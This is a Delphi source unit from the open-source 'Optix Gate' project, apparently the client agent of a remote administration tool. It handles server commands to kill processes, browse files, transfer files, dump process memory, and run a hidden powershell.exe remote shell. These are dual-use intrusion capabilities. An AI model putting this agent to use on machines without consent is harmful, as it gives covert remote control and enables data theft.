{******************************************************************************}
{                                                                              }
{         ____             _     ____          _           ____                }
{        |  _ \  __ _ _ __| | __/ ___|___   __| | ___ _ __/ ___|  ___          }
{        | | | |/ _` | '__| |/ / |   / _ \ / _` |/ _ \ '__\___ \ / __|         }
{        | |_| | (_| | |  |   <| |__| (_) | (_| |  __/ |   ___) | (__          }
{        |____/ \__,_|_|  |_|\_\\____\___/ \__,_|\___|_|  |____/ \___|         }
{                             Project: Optix Gate                              }
{                                                                              }
{                                                                              }
{                   Author: DarkCoderSc (Jean-Pierre LESUEUR)                  }
{                   https://www.twitter.com/darkcodersc                        }
{                   https://bsky.app/profile/darkcodersc.bsky.social           }
{                   https://github.com/darkcodersc                             }
{                   License: GPL v3                                            }
{                                                                              }
{                                                                              }
{                                                                              }
{  Disclaimer:                                                                 }
{  -----------                                                                 }
{    We are doing our best to prepare the content of this app and/or code.     }
{    However, The author cannot warranty the expressions and suggestions       }
{    of the contents, as well as its accuracy. In addition, to the extent      }
{    permitted by the law, author shall not be responsible for any losses      }
{    and/or damages due to the usage of the information on our app and/or      }
{    code.                                                                     }
{                                                                              }
{    By using our app and/or code, you hereby consent to our disclaimer        }
{    and agree to its terms.                                                   }
{                                                                              }
{    Any links contained in our app may lead to external sites are provided    }
{    for convenience only.                                                     }
{    Any information or statements that appeared in these sites or app or      }
{    files are not sponsored, endorsed, or otherwise approved by the author.   }
{    For these external sites, the author cannot be held liable for the        }
{    availability of, or the content located on or through it.                 }
{    Plus, any losses or damages occurred from using these contents or the     }
{    internet generally.                                                       }
{                                                                              }
{                                                                              }
{                                                                              }
{******************************************************************************}

unit Optix.Protocol.SessionHandler;

interface

{$I Optix.inc}

uses System.Classes, Generics.Collections, XSuperObject, Optix.Protocol.Client.Handler, Optix.Protocol.Packet,
     Optix.Protocol.Preflight, Optix.Protocol.Worker.FileTransfer, Optix.Func.Commands, Optix.Task,
     Optix.Actions.ProcessHandler;

type
  TShellAction = (
    saBreak,
    saTerminate
  );

  {$IFDEF CLIENT_GUI}
  TOptixSessionHandlerThread = class;

  TOnSessionHandlerEvent = procedure(Sender : TOptixSessionHandlerThread) of object;

  TOnConnectedToServer         = TOnSessionHandlerEvent;
  TOnDisconnectedFromServer    = TOnSessionHandlerEvent;
  TOnSessionHandlerDestroyed   = TOnSessionHandlerEvent;
  {$ENDIF}

  TOptixSessionHandlerThread = class(TOptixClientHandlerThread)
  private
    FTasks                    : TObjectList<TOptixTask>;
    FShellInstances           : TObjectList<TProcessHandler>;
    FFileTransferOrchestrator : TOptixFileTransferOrchestratorThread;

    {$IFDEF CLIENT_GUI}
    FOnConnectedToServer         : TOnConnectedToServer;
    FOnDisconnectedFromServer    : TOnDisconnectedFromServer;
    FOnSessionHandlerDestroyed   : TOnSessionHandlerDestroyed;
    {$ENDIF}

    {@M}
    procedure InitializeFileTransferOrchestratorThread();
  protected
    {@M}
    function InitializePreflightRequest() : TOptixPreflightRequest; override;
    procedure Initialize(); override;
    procedure Finalize(); override;

    procedure PollShellInstances();
    procedure PollActions(); override;
    procedure PollTasks();

    procedure RegisterNewFileTransfer(const ATransfer : TOptixCommandTransfer);
    procedure RegisterAndStartNewTask(const AOptixTask : TOptixTask);

    procedure RegisterAndStartNewShellInstance(const ACommand : TOptixStartShellInstance);
    procedure PerformActionOnShellInstance(const AInstanceId : TGUID; const AShellAction : TShellAction);
    procedure TerminateShellInstance(const ACommand : TOptixTerminateShellInstance);
    procedure BreakShellInstance(const ACommand : TOptixBreakShellInstance);
    procedure StdinToShellInstance(const ACommand : TOptixStdinShellInstance);

    procedure Connected(); override;
    procedure Disconnected(); override;
    procedure PacketReceived(const ASerializedPacket : ISuperObject); override;
  {$IFDEF CLIENT_GUI}
  public
    property OnConnectedToServer       : TOnConnectedToServer         write FOnConnectedToServer;
    property OnDisconnectedFromServer  : TOnDisconnectedFromServer    write FOnDisconnectedFromServer;
    property OnSessionHandlerDestroyed : TOnSessionHandlerDestroyed   write FOnSessionHandlerDestroyed;
    {$ENDIF}
  end;

implementation

uses Winapi.Windows, Optix.Func.SessionInformation, System.SysUtils, Optix.Func.Enum.Process, Optix.Actions.Process,
     Optix.Func.LogNotifier, Optix.Func.Enum.FileSystem, Optix.Thread, Optix.Task.ProcessDump, Optix.Func.Shell;


{ TOptixSessionHandlerThread.Initialize }
procedure TOptixSessionHandlerThread.Initialize();
begin
  inherited;
  ///

  FFileTransferOrchestrator := nil;
  FTasks := TObjectList<TOptixTask>.Create(True);
  FShellInstances := TObjectList<TProcessHandler>.Create(True);

  {$IFDEF CLIENT_GUI}
  FOnConnectedToServer         := nil;
  FOnDisconnectedFromServer    := nil;
  FOnSessionHandlerDestroyed := nil;
  {$ENDIF}
end;

{ TOptixSessionHandlerThread.Finalize }
procedure TOptixSessionHandlerThread.Finalize();
begin
  inherited;
  ///

  {$IFDEF CLIENT_GUI}
  if Assigned(FOnSessionHandlerDestroyed) then
    Synchronize(procedure begin
      FOnSessionHandlerDestroyed(self);
    end);
  {$ENDIF}

  if Assigned(FTasks) then
    FreeAndNil(FTasks);

  if Assigned(FShellInstances) then
    FreeAndNil(FShellInstances);
end;

{ TOptixSessionHandlerThread.InitializePreflightRequest }
function TOptixSessionHandlerThread.InitializePreflightRequest() : TOptixPreflightRequest;
begin
  result.ClientKind := ckHandler;
end;

{ TOptixSessionHandlerThread.PollTasks }
procedure TOptixSessionHandlerThread.PollTasks();
begin
  if not Assigned(FTasks) or (FTasks.Count = 0) then
    Exit();
  ///

  var ATasksToDelete := TList<TOptixTask>.Create();
  try
    for var ATask in FTasks do begin
      if ATask.Completed then begin
        AddPacket(TOptixTaskCallback.Create(ATask));

        ///
        ATasksToDelete.Add(ATask);
      end else if not ATask.RunningAware and ATask.Running then begin
        ATask.RunningAware := True;

        ///
        AddPacket(TOptixTaskCallback.Create(ATask));
      end;
    end;

    for var ATask in ATasksToDelete do
      FTasks.Remove(ATask);
  finally
    FreeAndNil(ATasksToDelete);
  end;
end;

{ TOptixSessionHandlerThread.PollShellInstances }
procedure TOptixSessionHandlerThread.PollShellInstances();
begin
  var AShellInstancesToDelete := TList<TProcessHandler>.Create();
  try
    for var AShellInstance in FShellInstances do begin
      if not AShellInstance.Active then begin
        AShellInstancesToDelete.Add(AShellInstance);

        ///
        continue;
      end;

      try
        var ARetrievedOutput := AShellInstance.ReadAvailableOutput();
        ///

        if not String.IsNullOrWhiteSpace(ARetrievedOutput) then
          AddPacket(TOptixShellOutput.Create(AShellInstance.GroupId, ARetrievedOutput, AShellInstance.InstanceId));
      except
        AShellInstance.Close();
      end;
    end;

    for var AShellInstance in AShellInstancesToDelete do begin
      // Notify server about a terminated shell instance
      var ATerminateShellInstance := TOptixTerminateShellInstance.Create(AShellInstance.InstanceId);
      ATerminateShellInstance.WindowGUID := AShellInstance.GroupId;
      AddPacket(ATerminateShellInstance);

      ///
      FShellInstances.Remove(AShellInstance);
    end;
  finally
    FreeAndNil(AShellInstancesToDelete);
  end;
end;

{ TOptixSessionHandlerThread.PerformActionOnShellInstance }
procedure TOptixSessionHandlerThread.PerformActionOnShellInstance(const AInstanceId : TGUID; const AShellAction : TShellAction);
begin
  for var AShellInstance in FShellInstances do begin
    if AShellInstance.InstanceId <> AInstanceId then
      continue;
    ///

    case AShellAction of
      saBreak : begin
        if AShellInstance.Active then
          AShellInstance.TryCtrlC;
      end;

      saTerminate :
        AShellInstance.TryClose();
    end;
  end;
end;

{ TOptixSessionHandlerThread.StdinToShellInstance }
procedure TOptixSessionHandlerThread.StdinToShellInstance(const ACommand : TOptixStdinShellInstance);
begin
  for var AShellInstance in FShellInstances do begin
    if AShellInstance.InstanceId <> ACommand.InstanceId then
      continue;
    try
      AShellInstance.WriteLn(ACommand.CommandLine);
    except
      AShellInstance.Close();
    end;
  end;
end;

{ TOptixSessionHandlerThread.TerminateShellInstance }
procedure TOptixSessionHandlerThread.TerminateShellInstance(const ACommand : TOptixTerminateShellInstance);
begin
  PerformActionOnShellInstance(ACommand.InstanceId, saTerminate);
end;

{ TOptixSessionHandlerThread.BreakhellInstance }
procedure TOptixSessionHandlerThread.BreakShellInstance(const ACommand : TOptixBreakShellInstance);
begin
  PerformActionOnShellInstance(ACommand.InstanceId, saBreak);
end;

{ TOptixSessionHandlerThread.RegisterAndStartNewShellInstance }
procedure TOptixSessionHandlerThread.RegisterAndStartNewShellInstance(const ACommand : TOptixStartShellInstance);
begin
  var AProcessHandler := TProcessHandler.Create('powershell.exe', ACommand.WindowGUID);

  AProcessHandler.ShowWindow := False;
  AProcessHandler.Start(True);

  ///
  FShellInstances.Add(AProcessHandler);
end;

{ TOptixSessionHandlerThread.PollActions }
procedure TOptixSessionHandlerThread.PollActions();
begin
  // Tasks -------------------------------------------------------------------------------------------------------------
  PollTasks();
  // Shell Instances ---------------------------------------------------------------------------------------------------
  PollShellInstances();
  // -------------------------------------------------------------------------------------------------------------------
end;

{ TOptixSessionHandlerThread.RegisterAndStartNewTask }
procedure TOptixSessionHandlerThread.RegisterAndStartNewTask(const AOptixTask : TOptixTask);
begin
  if not Assigned(AOptixTask) or not Assigned(FTasks) then
    Exit();
  ///

  var ATaskId := TGUID.NewGuid();

  AOptixTask.SetTaskId(ATaskId);

  AddPacket(TOptixTaskCallback.Create(AOptixTask));

  AOptixTask.Start();

  ///
  FTasks.Add(AOptixTask);
end;

{ TOptixSessionHandlerThread.InitializeFileTransferOrchestratorThread }
procedure TOptixSessionHandlerThread.InitializeFileTransferOrchestratorThread();
begin
  if not TOptixThread.HasRunningInstance(FFileTransferOrchestrator) then begin
    FFileTransferOrchestrator := TOptixFileTransferOrchestratorThread.Create(
      FClient.RemoteAddress,
      FClient.RemotePort,
      self
    );

    ///
    FFileTransferOrchestrator.Start();
  end;
end;

{ TOptixSessionHandlerThread.RegisterNewFileTransfer }
procedure TOptixSessionHandlerThread.RegisterNewFileTransfer(const ATransfer : TOptixCommandTransfer);
begin
  InitializeFileTransferOrchestratorThread();
  ///

  FFileTransferOrchestrator.AddTransfer(ATransfer);
end;

{ TOptixSessionHandlerThread.Connected }
procedure TOptixSessionHandlerThread.Connected();
begin
  inherited;
  ///

  {$IFDEF CLIENT_GUI}
  if Assigned(FOnConnectedToServer) then
    Synchronize(procedure begin
      FOnConnectedToServer(self);
    end);
  {$ENDIF}

  AddPacket(TOptixSessionInformation.Create());
end;

{ TOptixSessionHandlerThread.Disconnected }
procedure TOptixSessionHandlerThread.Disconnected();
begin
  inherited;
  ///

  {$IFDEF CLIENT_GUI}
  if Assigned(FOnDisconnectedFromServer) then
    Synchronize(procedure begin
      FOnDisconnectedFromServer(self);
    end);
  {$ENDIF}

  if TOptixThread.HasRunningInstance(FFileTransferOrchestrator) then begin
    TOptixThread.TerminateInstance(FFileTransferOrchestrator);

    ///
    FFileTransferOrchestrator := nil;
  end;
end;

{ TOptixSessionHandlerThread.PacketReceived }
procedure TOptixSessionHandlerThread.PacketReceived(const ASerializedPacket : ISuperObject);
begin
  if not Assigned(ASerializedPacket) or
     not ASerializedPacket.Contains('PacketClass') then
      Exit();
  ///

  // TODO: make it more generic (Class Registry or RTTI)
  var AClassName := ASerializedPacket.S['PacketClass'];

  var AWindowGUID := TGUID.Empty;
  if ASerializedPacket.Contains('WindowGUID') then
    AWindowGUID := TGUID.Create(ASerializedPacket.S['WindowGUID']);

  var AOptixPacket : TOptixPacket := nil;
  var AHandleMemory : Boolean := False;
  try
    try
      // ---------------------------------------------------------------------------------------------------------------
      if AClassName = TOptixCommandTerminate.ClassName then
        Terminate
      // ---------------------------------------------------------------------------------------------------------------
      else if AClassName = TOptixCommandRefreshProcess.ClassName then
        AddPacket(TProcessList.Create(AWindowGUID))
      // ---------------------------------------------------------------------------------------------------------------
      else if AClassName = TOptixCommandKillProcess.ClassName then begin
        AHandleMemory := True;
        ///

        AOptixPacket := TOptixCommandKillProcess.Create(ASerializedPacket);

        TProcessActions.TerminateProcess(TOptixCommandKillProcess(AOptixPacket).ProcessId);

        ///
        AddPacket(AOptixPacket); // Callback
      end
      // ---------------------------------------------------------------------------------------------------------------
      else if AClassName = TOptixCommandRefreshDrives.ClassName then
        AddPacket(TDriveList.Create(AWindowGUID))
      // ---------------------------------------------------------------------------------------------------------------
      else if AClassName = TOptixCommandRefreshFiles.ClassName then begin
        AOptixPacket := TOptixCommandRefreshFiles.Create(ASerializedPacket);

        AddPacket(TFileList.Create(AWindowGUID, TOptixCommandRefreshFiles(AOptixPacket).Path));
      end
      // ---------------------------------------------------------------------------------------------------------------
      else if AClassName = TOptixCommandDownloadFile.ClassName then
        RegisterNewFileTransfer(TOptixCommandDownloadFile.Create(ASerializedPacket))
      // ---------------------------------------------------------------------------------------------------------------
      else if AClassName = TOptixCommandUploadFile.ClassName then
        RegisterNewFileTransfer(TOptixCommandUploadFile.Create(ASerializedPacket))
      // ---------------------------------------------------------------------------------------------------------------
      else if AClassName = TOptixCommandProcessDump.ClassName then begin
        AHandleMemory := True;
        ///

        AOptixPacket := TOptixCommandProcessDump.Create(ASerializedPacket);

        RegisterAndStartNewTask(TOptixProcessDumpTask.Create(TOptixCommandProcessDump(AOptixPacket)));
      end
      // ---------------------------------------------------------------------------------------------------------------
      else if AClassName = TOptixStartShellInstance.ClassName then begin
        AOptixPacket := TOptixStartShellInstance.Create(ASerializedPacket);

        RegisterAndStartNewShellInstance(TOptixStartShellInstance(AOptixPacket));
      end
      // ---------------------------------------------------------------------------------------------------------------
      else if AClassName = TOptixTerminateShellInstance.ClassName then begin
        AOptixPacket := TOptixTerminateShellInstance.Create(ASerializedPacket);

        TerminateShellInstance(TOptixTerminateShellInstance(AOptixPacket));
      end
      // ---------------------------------------------------------------------------------------------------------------
      else if AClassName = TOptixBreakShellInstance.ClassName then begin
        AOptixPacket := TOptixBreakShellInstance.Create(ASerializedPacket);

        BreakShellInstance(TOptixBreakShellInstance(AOptixPacket));
      end
      // ---------------------------------------------------------------------------------------------------------------
      else if AClassName = TOptixStdinShellInstance.ClassName then begin
        AOptixPacket := TOptixStdinShellInstance.Create(ASerializedPacket);

        StdinToShellInstance(TOptixStdinShellInstance(AOptixPacket));
      end
      // ---------------------------------------------------------------------------------------------------------------
      
      // ---------------------------------------------------------------------------------------------------------------

      // ---------------------------------------------------------------------------------------------------------------

      // ---------------------------------------------------------------------------------------------------------------

      // ---------------------------------------------------------------------------------------------------------------

      // ---------------------------------------------------------------------------------------------------------------

      // ---------------------------------------------------------------------------------------------------------------

      // ---------------------------------------------------------------------------------------------------------------

      // ---------------------------------------------------------------------------------------------------------------

      // ---------------------------------------------------------------------------------------------------------------

      // ---------------------------------------------------------------------------------------------------------------

      // ---------------------------------------------------------------------------------------------------------------

      // ---------------------------------------------------------------------------------------------------------------

      // ---------------------------------------------------------------------------------------------------------------

      // ---------------------------------------------------------------------------------------------------------------

      // ---------------------------------------------------------------------------------------------------------------

      // ---------------------------------------------------------------------------------------------------------------

      // ---------------------------------------------------------------------------------------------------------------

      // ---------------------------------------------------------------------------------------------------------------
      // ... //
    except
      on E : Exception do
        AddPacket(TLogNotifier.Create(E.Message, AClassName, lkException));
    end;
  finally
    if not AHandleMemory and Assigned(AOptixPacket) then
      FreeAndNil(AOptixPacket);
  end;
end;

end.
